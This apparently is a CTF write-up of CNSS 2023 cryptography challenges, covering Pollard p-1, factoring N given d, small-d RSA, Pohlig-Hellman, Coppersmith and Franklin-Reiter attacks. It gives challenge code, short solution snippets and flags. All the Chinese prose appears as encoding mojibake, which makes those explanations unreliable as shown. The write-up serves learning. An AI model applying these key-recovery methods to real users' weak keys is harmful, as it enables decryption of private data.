<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lordtianqiyi/articles/17069448.html">å…¶å®</a>ä¸éš¾å‘ç° $ B!\ |\ p-1$ã€‚æ‰€ä»¥åªéœ€æ‰¾åˆ°ä¸€ä¸ªåˆé€‚å¤§å°çš„æ•° $B$ï¼Œå°±å¯ä»¥åœ¨å¤šé¡¹å¼æ—¶é—´å†…å‡ºç»“æœï¼Œæ‹¿åˆ° <a target="_blank" rel="noopener" href="https://github.com/Aununo/hi/blob/main/ctf_crypto/cnss/%F0%9F%90%A0Fun_factoring.py">flag1</a>ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp</span></span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">B = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    a = <span class="built_in">pow</span>(a, B, N)</span><br><span class="line">    res = gcd(a - <span class="number">1</span>, N)</span><br><span class="line">    <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">        q = N // res</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    B += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<article class="message message-immersive is-primary"> <div class="message-body"> <i class="fas fa-info-circle mr-2"></i>cnss{1f_y0u_Kn0w_Pollard_y0u_Kn0w_1t_4ll}</div> </article>

<p>æ³¨æ„åˆ° hint2 å®é™…ä¸Šæ˜¯ $e$ å’Œ $d$ çš„ä¹˜ç§¯ï¼Œè®¡ç®— $k&#x3D;ed-1$ ä¸º $p-1$ çš„å€æ•°ã€‚é€‰éšæœºæ•° $g\in(1,N)$ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://www.di-mgt.com.au/rsa_factorize_n.html">RSA: how to factorize N given d</a></p>
<p>$k$ ä¸ºå¶æ•°ï¼Œæ•… $k&#x3D;2^t\cdot r$ï¼Œå…¶ä¸­ $r$ ä¸ºå¥‡æ•°ä¸” $t\geq 1$ï¼Œç„¶åè®¡ç®— $x&#x3D;g^{\frac{k}{2}},g^{\frac{k}{4}},â€¦,g^{\frac{k}{2^t}}\pmod{N}$ ç›´åˆ° $x&gt;1$ ä¸” $y&#x3D;gcd(x-1,N)&gt;1$ã€‚å¦‚æœ $y$ å­˜åœ¨ï¼Œåˆ™ $p&#x3D;y$ï¼›è‹¥ä¸å­˜åœ¨ï¼Œåˆ™é‡æ–°ç”Ÿæˆ $g$.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp</span></span><br><span class="line">k = e * d - <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    g = random.randint(<span class="number">2</span>, n-<span class="number">1</span>)</span><br><span class="line">    t = k</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> t % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        t //= <span class="number">2</span></span><br><span class="line">        x = <span class="built_in">pow</span>(g, t, n)</span><br><span class="line">        <span class="keyword">if</span> x &gt; <span class="number">1</span> <span class="keyword">and</span> gcd(x - <span class="number">1</span>, n) &gt; <span class="number">1</span>:</span><br><span class="line">            p = gcd(x - <span class="number">1</span>, n)</span><br><span class="line">            <span class="keyword">return</span> (p, n // p)</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®æ¬§æ‹‰å®šç†<br>$$<br>g^{\phi(n2)\cdot(r-1)}\equiv1\pmod{hint1}<br>$$<br>è€Œè®¾ $ed-1&#x3D;k\phi(n2)$ï¼Œæµ‹è¯•å¯çŸ¥ $k&gt;&gt;r-1$ï¼Œåˆ™æœ‰<br>$$<br>g^{ed-1}\equiv 1\pmod{hint1}<br>$$<br>æ‰€ä»¥ï¼Œæˆ‘ä»¬å…ˆé€šè¿‡ hint1 æŠŠ n2 åˆ†è§£å‡ºæ¥ï¼Œå†åˆ†è§£å‡º p2 å’Œ q2 æ‹¿åˆ° <a target="_blank" rel="noopener" href="https://github.com/Aununo/hi/blob/main/ctf_crypto/cnss/%F0%9F%90%A0Fun_factoring.py">flag2</a>ã€‚</p>
<article class="message message-immersive is-primary"> <div class="message-body"> <i class="fas fa-info-circle mr-2"></i>cnss{Factoring_the_modulus_1s_FUn_fuN_Fun_f0r_The_whOLe_F4miLY!}</div> </article>

<p>è¿™ä¸¤ç§æ–¹æ³•çš„æ ¸å¿ƒå°±æ˜¯<strong>è´¹é©¬å°å®šç†</strong>ã€‚</p>
<h2 id="ğŸ¦¢BabyCurve"><a href="#ğŸ¦¢BabyCurve" class="headerlink" title="ğŸ¦¢BabyCurve"></a>ğŸ¦¢BabyCurve</h2><p>å¦‚ä½•åœ¨æ¤­åœ†æ›²çº¿ä¸Šå®šä¹‰ä¸€ä¸ªç¾¤å‘¢ï¼Ÿ</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    enc = cipher.encrypt(pad(data, AES.block_size))</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line">p = <span class="number">9348030992978262347982920431034912130716881552084115381757548130699185130820479730646974634141092089651314678852571714802122984104452942803209295252010181</span></span><br><span class="line">a = <span class="number">7763518046982192251231517150944105482004832971680748456996310159078009542876654956303764776823623497403884988108392624824526960061132573798331838835960909</span></span><br><span class="line">b = <span class="number">10997613169313236085705837600762108982163011398922795151006166411501358991822489779966644769325114384948484844491824976044124478063235526767931678399125511</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    key = urandom(<span class="number">16</span>) </span><br><span class="line">    x = ZZ(bytes_to_long(key)) </span><br><span class="line">    <span class="keyword">if</span> E.is_x_coord(x): </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">enc = encrypt(flag, key)</span><br><span class="line">P = E.lift_x(x) <span class="comment">#æ ¹æ®xåæ ‡æ‰¾åˆ°ç‚¹P</span></span><br><span class="line">Q = e * P</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Q = <span class="subst">&#123;(Q[<span class="number">0</span>], Q[<span class="number">1</span>])&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;enc = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Q = (702269728158503157149596097443623465665001736303612719716566418594125500303838352102906729735173073066319779069987350585597471722439620961396365725087358, 7741251535874845030195254089473397439416170375681731646623904995909698213716045714883145323049811857989495704699439881764120694648581710750825272993480662)</span></span><br><span class="line"><span class="string">enc = b&#x27;c\xea\x0eO\xf1V\n&quot;\xf4\xd5V\x10\x06\x85\xd8a\xe5`\xab\xd4\x9b\x96Fz+:\x0b\xaeg-\x92\xe6\xfb:\xc7\xaf\x1b&lt;\x04\xf0\x81\xb8\xbf\xc6\x96\x16q\x17\xd0\xb4F\x92L]\xa4\xe9|\xe1\xafg?\x1c\x88u&#123;\x91\xe5=\x0c\xdb\xb6S\x02\xdd4\x90F.\xe8\xa9&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>ç®€å•çš„æ¤­åœ†æ›²çº¿ç¾¤ï¼Œsage è·‘ä¸€ä¸‹å°±è¡Œäº†ã€‚ä¸»è¦æ˜¯æ±‚ e åœ¨æ¤­åœ†æ›²çº¿ç¾¤ E ä¸Šçš„é€†å…ƒ dã€‚ç†Ÿæ‚‰ä¸€ä¸‹ sage é‡Œå’Œ EllipticCurve ç›¸å…³çš„æ“ä½œå³å¯ã€‚è¿è¡Œä¸€æ®µæ—¶é—´ï¼Œæ‹¿åˆ° <a target="_blank" rel="noopener" href="https://github.com/Aununo/hi/blob/main/ctf_crypto/cnss/2023/%F0%9F%A6%A2BabyCurve.py">flag</a>ã€‚</p>
<article class="message message-immersive is-primary"> <div class="message-body"> <i class="fas fa-info-circle mr-2"></i>cnss{The elliptic curve 0ver a fin1te f1eld is an ab3lian group!}</div> </article>



<h2 id="ğŸ”‘Small-private-key"><a href="#ğŸ”‘Small-private-key" class="headerlink" title="ğŸ”‘Small private key"></a>ğŸ”‘Small private key</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p**<span class="number">2</span> * q</span><br><span class="line">beta = <span class="number">0.17</span></span><br><span class="line">d = getPrime(<span class="built_in">int</span>(n.bit_length() * beta))</span><br><span class="line">phi = p * (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = inverse(d, phi)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e = 99229505005010231229812309405118621210000665411317929329600320339351298536042106221904006618372016899838834315350282056201576780947332634472383794182914396787560149770087768346108970874622698958641239168672884943722683097496196568051260666405536471900271607250500649553508481028777575476228205350216263899864839231023168979708315202587104442940310612179957452668838181940302165426024768292895768359058100485442771122055233699699591861456009579197208612724634653</span></span><br><span class="line"><span class="string">n = 777932066471261253953635643543769273870576807001853821365002899038017652136640326606707541086305255419688451331308105858262381681205657118149670724969402173491693110671887550886032285747295962582655746980079520315019448934437742771629769039207570002600238133829941166519652324878087610266956030449933384381670213413005273221487049001640280300893616812980727738757188984406451974046745624206457936867759992076616467784551949417643382015447862723484003189099322113</span></span><br><span class="line"><span class="string">c = 315162533057119030644069576898014821746187831990641977888442441986396488578480924344830827691640071104116111429579458497274291449212879753454215527936892759921631840278976085540574066181311866181244489267112630519512826615435097016920565522260797348024774745088674028891909401404506165402416608686728774514537539009768594970540227164117320018763121106885108998344223691343126585144804733329828035450075042672319188914135360404008915353519214959250876459809490891</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä¸€ä¸ª winner attackã€‚Google æœåˆ°ä¸€ç¯‡è®ºæ–‡ <a target="_blank" rel="noopener" href="https://iopscience.iop.org/article/10.1088/1742-6596/622/1/012019/pdf">New Attacks on RSA with Modulus N &#x3D; p2q Using Continued Fractions</a>ï¼Œæ‹¿ AI ç¿»è¯‘äº†ä¸€éç®—æ³•ï¼Œæ‹¿åˆ° <a target="_blank" rel="noopener" href="https://github.com/Aununo/hi/blob/main/ctf_crypto/cnss/2023/%F0%9F%94%91Small%20private%20key.py">flag</a>ã€‚</p>
<article class="message message-immersive is-primary"> <div class="message-body"> <i class="fas fa-info-circle mr-2"></i>cnss{Th1s is the p0wer of continu3d fr@ction hhhhhhh}</div> </article>



<h2 id="ğŸ¿ï¸ç‰©ä¸çŸ¥æ•°"><a href="#ğŸ¿ï¸ç‰©ä¸çŸ¥æ•°" class="headerlink" title="ğŸ¿ï¸ç‰©ä¸çŸ¥æ•°"></a>ğŸ¿ï¸ç‰©ä¸çŸ¥æ•°</h2><p>ä»Šæœ‰ç‰©ä¸çŸ¥å…¶æ•°ï¼Œä¸‰ä¸‰æ•°ä¹‹å‰©äºŒï¼Œäº”äº”æ•°ä¹‹å‰©ä¸‰ï¼Œä¸ƒä¸ƒæ•°ä¹‹å‰©äºŒï¼Œé—®ç‰©å‡ ä½•ï¼Ÿ</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> prod</span><br><span class="line"><span class="keyword">from</span> Secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">256</span></span><br><span class="line">factors = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    factors.append(getPrime(<span class="number">64</span>))</span><br><span class="line">factors.append(getPrime(<span class="number">256</span>))</span><br><span class="line">n = prod(factors)</span><br><span class="line">g = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">h = <span class="built_in">pow</span>(g, m, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;h =&#x27;</span>, h)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 3322653117860796307881702118715938603299933196422318170688239817538863269879196751517883984368101175912757699818959313188577820238991745748791220070657861</span></span><br><span class="line"><span class="string">h = 2124833808496595853801133466156124859021541288125712571058299295082272671181015365259674266573518307514981326822864098542354452199064749348011358863682094</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜åœ¨æ±‚ DLPï¼Œå…ˆåˆ†è§£ nï¼Œå†ç»“åˆ CRTï¼Œä¾é å‰å››ä¸ªå› å­å°±è¡Œï¼Œæ‹¿åˆ° <a target="_blank" rel="noopener" href="https://github.com/Aununo/hi/blob/main/ctf_crypto/cnss/2023/%F0%9F%90%BF%EF%B8%8F%E7%89%A9%E4%B8%8D%E7%9F%A5%E6%95%B0.py">flag</a>ã€‚å…¶å®å°±æ˜¯ <a target="_blank" rel="noopener" href="https://ctf-wiki.org/crypto/asymmetric/discrete-log/discrete-log/#pohlig-hellman-algorithm">Pohlig-Hellman algorithm</a>ã€‚</p>
<article class="message message-immersive is-primary"> <div class="message-body"> <i class="fas fa-info-circle mr-2"></i>cnss{Wow!The CRT 1s S0 u5eful!}</div> </article>



<h2 id="âš’ï¸é“œåŒ çš„è‰ºæœ¯â…¡"><a href="#âš’ï¸é“œåŒ çš„è‰ºæœ¯â…¡" class="headerlink" title="âš’ï¸é“œåŒ çš„è‰ºæœ¯â…¡"></a>âš’ï¸é“œåŒ çš„è‰ºæœ¯â…¡</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">s = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">r1, r2 = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">b1, b2 = getPrime(<span class="number">246</span>), getPrime(<span class="number">246</span>)</span><br><span class="line">d1 = inverse(s+r1, p) - b1</span><br><span class="line">d2 = inverse(s+r2, p) - b2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;p = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;d1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;d2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;r1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;r2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 151530040749164553403967983518843577352864270263889106337011110378601036680690471836027157653547709937519393960972849334865341611877035904693178333416457975524708748243011699123245181968472855540946305680746439921799620880630731896672163604054069337581059081562076860588954007665828525502756791219539357191539</span></span><br><span class="line"><span class="string">d1 = 50083234780783999664902204148367665654965860210705806460611800714011984032825099659257301169981655933116226437075588050862473758014777833755744093767631735454786283542732504816602375269658543953884652005423131768292669188376398437788186070246006877324243974392923640712035990908502571083697320506587058057087</span></span><br><span class="line"><span class="string">d2 = 91453105340363659854895114107811465809020665893141480802534401849670186432558336798544994184391985650330332142766844489480723736690400200157100330182955996913526651749892519448150014139485635391932575239621990448927615793198397632259445575664911965643266433167901384050043834029621593534439503767913891826664</span></span><br><span class="line"><span class="string">r1 = 7100211561130020745317757673987451075767374867154791943756942873384127138552062792930795789238580479594394979173335338862606838173069964831049512647184151</span></span><br><span class="line"><span class="string">r2 = 9000155708454100491902006607890753523170880329077738766151247940110441586305244492413508062919425173224196956216820961804625696491943075045460554703545531</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ä¸ä¼šã€‚</p>
<h2 id="â›ï¸é“œåŒ çš„è‰ºæœ¯â… "><a href="#â›ï¸é“œåŒ çš„è‰ºæœ¯â… " class="headerlink" title="â›ï¸é“œåŒ çš„è‰ºæœ¯â… "></a>â›ï¸é“œåŒ çš„è‰ºæœ¯â… </h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">512</span></span><br><span class="line">N = <span class="number">1024</span></span><br><span class="line">P = <span class="number">256</span></span><br><span class="line">p = getPrime(P)</span><br><span class="line">q = getPrime(N-P)</span><br><span class="line">n = p * q</span><br><span class="line">d = p</span><br><span class="line">e = inverse(d, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 118542873900747265901972229877883243863455720266210015956664954705111625457638899855027122945522479781037404808597170399339837193705757680088860677997958907356598337673929983523887709805385841477614948436454673040596579313465066950050748901502261100925866106567136278276272183814389727065752049737673528788851</span></span><br><span class="line"><span class="string">c = 85091710660465995062917932706421029612933738881922031822674968124253137988309351810508978584348197911485561426918031817399685522559286375310408913518074664331882588344176796591922444160725511070449908851983275493777666568865120499654769828318792734657142197271358769027319683651960777955741591424859221331570</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>p å’Œ q ç›¸å·®å¾ˆå¤§ï¼Œunbalanced rsaï¼Œæœåˆ°äº†ä¸€ç¯‡mapleçš„<a target="_blank" rel="noopener" href="https://blog.maple3142.net/2021/12/07/hitcon-ctf-2021-writeups/#a-little-easy-rsa">ä¸€æ¨¡ä¸€æ ·</a>çš„åšå®¢ï¼Œd &#x3D; pï¼Œæ„å‘³ç€<br>$$<br>en\equiv epq \equiv q\pmod{\phi(n)}<br>$$<br>æ ¹æ® Euler Theoremï¼Œ$2^{en}\equiv 2^q \pmod{n}$ï¼Œå†æ ¹æ® Fermat å°å®šç†ï¼Œreduce åˆ°æ¨¡ qï¼Œæœ‰<br>$$<br>2^{en}\equiv 2^q\equiv 2\pmod{q}<br>$$<br>æ‰€ä»¥ $gcd(2^{en}-2)$ æ˜¯ $n$ çš„ä¸€ä¸ª nontrival factorã€‚ç»™ e çš„è¯å°±å¯ä»¥ç›´æ¥è§£äº†ï¼Œä½†è¿™é¢˜æ²¡ç»™ã€‚</p>
<p>é‚£ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨$m^{en}\equiv m\pmod{q}$ä¸‹ï¼Œæ„é€ å¤šé¡¹å¼ $f(x)&#x3D;x^{en}-x$ï¼Œcoppersmith æ‰¾åˆ°å…¶åœ¨æ¨¡æ„ä¹‰ä¸‹çš„æ ¹ $m$ï¼Œæ‹¿åˆ° <a target="_blank" rel="noopener" href="https://github.com/Aununo/hi/blob/main/ctf_crypto/cnss/2023/%E2%9B%8F%EF%B8%8F%E9%93%9C%E5%8C%A0%E7%9A%84%E8%89%BA%E6%9C%AF%E2%85%A0.py">flag</a>ã€‚</p>
<article class="message message-immersive is-primary"> <div class="message-body"> <i class="fas fa-info-circle mr-2"></i>cnss{Am@zing!Y0u hav3 found the art 0f c0pper5mith!}</div> </article>



<h2 id="ğŸ˜‹å’æ˜¯æ¬§å‡ é‡Œå¾—"><a href="#ğŸ˜‹å’æ˜¯æ¬§å‡ é‡Œå¾—" class="headerlink" title="ğŸ˜‹å’æ˜¯æ¬§å‡ é‡Œå¾—"></a>ğŸ˜‹å’æ˜¯æ¬§å‡ é‡Œå¾—</h2><p>GCDç®—æ³•ä¸ä¸€å®šåªç”¨åœ¨æ•´æ•°ç¯ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">240</span></span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">127</span></span><br><span class="line">delta = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m + delta * randint(<span class="number">1</span>, <span class="number">16</span>), e, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m + delta * randint(<span class="number">1</span>, <span class="number">16</span>), e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;delta =&#x27;</span>, delta)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1 =&#x27;</span>, c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2 =&#x27;</span>, c2)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 106779363880076711773075699433100599895752060445908922588084993492786672784954758549724923806403815118329157370314538739556401945331526955585157296102995095058754131439773509333156269006100625688320139764686427638742922183379567401526489614734413753625605868977997707989608662119117472672541825583454466252249</span></span><br><span class="line"><span class="string">delta = 118213943928964692131681911554523043480519176140778442241686032633789966281330512604904235341538576163059642583837358962734675482139463734627459846464016893267630963298445219866530559060385220958414475107951781234568817651589371875381274817463012860268745594355922832515274085557941829993477982849565203831157</span></span><br><span class="line"><span class="string">c1 = 34663150129434657933013580561073403868368642117172823953309968804053630576027962656647472614936858072893901317336864316142615890221332765871236633745002723914241788757810175949804415680907931109864935094279302980782233439010460241333733342348240105606827729876563669989545941758458007227666481095933161752880</span></span><br><span class="line"><span class="string">c2 = 20732184545170566185887724502415035711290809508036601172320311201995234181771554470576913863496604707865719290738222775905251826243178014149682876398475630299003284439939330536792467070111163515963000915599545258223116155880179560004989878902770439637039588673994503746074047210052685834276257197511496439251</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡ŒAliceç”¨åŒä¸€å…¬é’¥eå¯¹ä¸¤ä¸ªå…·æœ‰çº¿æ€§å…³ç³»çš„æ¶ˆæ¯åŠ å¯†ï¼Œå¹¶å°†åŠ å¯†åçš„æ¶ˆæ¯å‘é€ç»™äº†Bobã€‚æ»¡è¶³<a target="_blank" rel="noopener" href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/">Related Message Attack</a>çš„æ”»å‡»æ¡ä»¶ï¼Œ<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Coppersmith's_attack#Franklin%E2%80%93Reiter_related-message_attack">Franklinâ€“Reiter related-message attack</a>å³å¯ã€‚</p>
<p>åœ¨<a target="_blank" rel="noopener" href="https://www.ruanx.net/coppersmith/">è¿™ç¯‡åšå®¢</a>é‡Œæ‰¾åˆ°äº†ä¸€æ¨¡ä¸€æ ·çš„æ”»å‡»ã€‚</p>
